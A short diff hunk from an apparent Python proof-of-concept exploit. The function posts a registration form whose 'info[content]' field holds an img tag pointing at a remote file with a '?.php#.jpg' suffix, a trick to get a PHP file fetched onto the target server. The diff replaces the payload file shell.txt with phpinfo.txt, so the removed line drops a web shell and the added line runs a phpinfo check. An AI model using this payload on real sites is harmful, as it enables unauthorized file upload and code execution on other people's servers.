@@ -14,7 +14,7 @@ def poc(url):
         'username': 'test'+ran_str,
         'password': 'testxxxxx',
         'email': 'test' + ran_str + '@test.com',
-        'info[content]': '<img src=' + url + '/shell.txt?.php#.jpg>', 
+        'info[content]': '<img src=' + url + '/phpinfo.txt?.php#.jpg>', 
         'dosubmit': '1',
     }
     rep = requests.post(u, data=data)
